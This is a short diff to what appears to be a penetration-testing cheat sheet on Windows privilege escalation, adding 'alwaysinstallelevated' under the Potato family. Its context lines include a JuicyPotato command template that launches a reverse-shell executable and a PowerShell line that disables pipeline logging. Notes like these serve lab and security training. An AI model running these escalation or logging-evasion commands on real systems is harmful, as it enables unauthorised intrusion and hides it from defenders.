@@ -892,6 +892,7 @@ $snap.LogPipelineExecutionDetails = $false
 #### Potato family
 - [More info](https://0xaniket.medium.com/tryhackme-retro-walkthrough-b1197c3c05fb)
 - Privilege **SeImpersonatePrivilege** and/or **SeAssignPrimaryTokenPrivilege**
+- alwaysinstallelevated
 - JuicyPotato
 	- [releases](https://github.com/ohpe/juicy-potato/releases)
 	- juicypotato.exe -l PORT -p REVSHELL.exe -t * -c {[FIND_CLSID](https://ohpe.it/juicy-potato/CLSID/)]}
